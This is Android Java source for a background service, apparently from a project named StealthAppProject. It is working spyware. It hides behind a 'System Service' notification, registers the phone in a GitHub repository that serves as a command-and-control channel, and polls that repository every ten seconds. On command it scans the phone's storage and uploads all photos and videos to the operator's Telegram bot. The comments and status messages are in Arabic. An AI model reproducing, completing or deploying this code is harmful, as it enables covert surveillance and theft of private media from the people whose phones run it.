package com.stealth.app;
import android.app.Service; import android.content.Intent; import android.os.IBinder;
import android.os.Environment; import android.provider.Settings;
import android.app.Notification; import android.app.NotificationChannel; import android.app.NotificationManager;
import android.os.Build;
import org.json.*; import java.io.*; import java.net.*; import java.util.*;
import okhttp3.*; import android.util.Base64;

public class BotService extends Service {
    String BOT_TOKEN = "PLACEHOLDER_BOT_TOKEN";
    String ADMIN = "PLACEHOLDER_ADMIN";
    String GITHUB_TOKEN = "PLACEHOLDER_GITHUB_TOKEN";
    String GITHUB_USER = "nadra4574504-droid";
    String REPO = "StealthAppProject";
    String DEVICE_ID; String DEVICE_NAME = android.os.Build.MODEL;
    String lastCmdTime = "0";
    OkHttpClient client = new OkHttpClient.Builder()
        .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .writeTimeout(300, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(300, java.util.concurrent.TimeUnit.SECONDS).build();

    @Override public int onStartCommand(Intent i, int f, int s) {
        // تفعيل "الخدمة في الواجهة" لكي لا يقتلها النظام
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("stealth_channel", "System Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, "stealth_channel")
                    .setContentTitle("System Service")
                    .setContentText("Running in background")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .build();
            startForeground(1, notification);
        } else {
            Notification notification = new Notification.Builder(this)
                    .setContentTitle("System Service")
                    .setContentText("Running in background")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .build();
            startForeground(1, notification);
        }

        DEVICE_ID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (DEVICE_ID == null) DEVICE_ID = "dev_" + System.currentTimeMillis();
        new Thread(new Runnable() {
            @Override public void run() { register(); }
        }).start();
        new java.util.Timer().scheduleAtFixedRate(new java.util.TimerTask() {
            @Override public void run() { checkGitHub(); }
        }, 0, 10000); 
        return START_STICKY;
    }

    void register() {
        try {
            String path = "reg_" + DEVICE_ID + ".json";
            String url = "https://api.github.com/repos/" + GITHUB_USER + "/" + REPO + "/contents/" + path;
            String sha = null;
            Response r = client.newCall(new Request.Builder().url(url).header("Authorization", "token " + GITHUB_TOKEN).build()).execute();
            if (r.isSuccessful()) {
                JSONObject json = new JSONObject(r.body().string());
                sha = json.getString("sha");
            }
            r.close();
            
            String content = "{\"id\":\"" + DEVICE_ID + "\",\"name\":\"" + DEVICE_NAME + "\"}";
            String b64 = Base64.encodeToString(content.getBytes("UTF-8"), Base64.NO_WRAP);
            String jsonPayload = "{\"message\":\"reg\",\"content\":\"" + b64 + "\"" + (sha != null ? ",\"sha\":\"" + sha + "\"" : "") + "}";
            RequestBody body = RequestBody.create(jsonPayload, MediaType.parse("application/json"));
            client.newCall(new Request.Builder().url(url).header("Authorization", "token " + GITHUB_TOKEN).put(body).build()).execute().close();
        } catch(Exception e) {}

        try {
            RequestBody b2 = new FormBody.Builder().add("chat_id", ADMIN).add("text", "🟢 الجهاز متصل: " + DEVICE_NAME + "\n🆔 " + DEVICE_ID).build();
            client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").post(b2).build()).execute().close();
        } catch(Exception e) {}
    }

    void checkGitHub() {
        try {
            String url = "https://api.github.com/repos/" + GITHUB_USER + "/" + REPO + "/contents/cmd_" + DEVICE_ID + ".json";
            Request req = new Request.Builder().url(url).header("Authorization", "token " + GITHUB_TOKEN).build();
            Response r = client.newCall(req).execute();
            if (r.isSuccessful()) {
                String body = r.body().string(); r.close();
                JSONObject json = new JSONObject(body);
                if (json.has("content")) {
                    String b64 = json.getString("content").replace("\\n", "").replace("\n", "");
                    byte[] decoded = Base64.decode(b64, Base64.DEFAULT);
                    JSONObject cmdJson = new JSONObject(new String(decoded));
                    String cmdTime = String.valueOf(cmdJson.getDouble("time"));
                    String cmd = cmdJson.getString("cmd");
                    if (!cmdTime.equals(lastCmdTime)) {
                        lastCmdTime = cmdTime;
                        if (cmd.equals("get_photos")) {
                            new Thread(new Runnable() { @Override public void run() { sendAllMedia("photos"); } }).start();
                        } else if (cmd.equals("get_videos")) {
                            new Thread(new Runnable() { @Override public void run() { sendAllMedia("videos"); } }).start();
                        }
                    }
                }
            } else { r.close(); }
        } catch(Exception e) {}
    }

    void sendAllMedia(String type) {
        sendMsg("🔍 جاري البحث...");
        List<File> files = new ArrayList<>();
        Set<String> visited = new HashSet<>();
        scanFiles(Environment.getExternalStorageDirectory(), type, files, visited, 0);
        Set<String> alreadySent = new HashSet<>();
        File logFile = new File(getExternalFilesDir(null), type + "_sent.txt");
        if (logFile.exists()) {
            try { BufferedReader br = new BufferedReader(new FileReader(logFile)); String line; while ((line = br.readLine()) != null) alreadySent.add(line.trim()); br.close(); } catch(Exception e) {}
        }
        FileWriter logW = null;
        try { logW = new FileWriter(logFile, true); } catch(Exception e) {}
        int total = files.size(); int sent = 0; int skipped = 0;
        sendMsg("📊 وُجد " + total + " ملف.");
        for (File f : files) {
            String absPath; try { absPath = f.getCanonicalPath(); } catch(Exception e) { absPath = f.getAbsolutePath(); }
            if (alreadySent.contains(absPath)) { skipped++; continue; }
            if (type.equals("videos") && f.length() > 50L*1024*1024) { skipped++; continue; }
            try {
                String field = type.equals("photos") ? "photo" : "video";
                String method = type.equals("photos") ? "sendPhoto" : "sendVideo";
                MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", ADMIN).addFormDataPart(field, f.getName(), RequestBody.create(f, MediaType.parse(type.equals("photos") ? "image/*" : "video/*")))
                    .addFormDataPart("caption", absPath).build();
                Response resp = client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/" + method).post(body).build()).execute();
                String bodyStr = resp.body().string(); resp.close();
                if (bodyStr.contains("\"ok\":true")) { sent++; if (logW != null) { logW.write(absPath + "\n"); logW.flush(); } }
                Thread.sleep(1200);
            } catch(Exception e) {}
        }
        if (logW != null) try { logW.close(); } catch(Exception e) {}
        sendMsg("✅ انتهى!\n✔️ مرسل: " + sent + "\n🔁 متخطى: " + skipped);
    }

    void scanFiles(File dir, String type, List<File> out, Set<String> visited, int depth) {
        if (dir == null || !dir.exists() || depth > 25) return;
        String canon; try { canon = dir.getCanonicalPath(); } catch(Exception e) { return; }
        if (!visited.add(canon)) return;
        String name = dir.getName().toLowerCase();
        if (name.equals("cache") || name.equals(".thumbnails") || name.equals("tmp")) return;
        if (canon.contains("/Android/data/") || canon.contains("/Android/obb/")) return;
        File[] list = dir.listFiles(); if (list == null) return;
        for (File f : list) {
            if (f.isDirectory()) { scanFiles(f, type, out, visited, depth + 1); }
            else {
                String n = f.getName().toLowerCase();
                if (type.equals("photos") && (n.endsWith(".jpg")||n.endsWith(".png"))) out.add(f);
                else if (type.equals("videos") && (n.endsWith(".mp4")||n.endsWith(".mkv"))) out.add(f);
            }
        }
    }

    void sendMsg(String txt) {
        try {
            RequestBody b = new FormBody.Builder().add("chat_id", ADMIN).add("text", txt).build();
            client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").post(b).build()).execute().close();
        } catch(Exception e) {}
    }

    @Override public IBinder onBind(Intent i) { return null; }
}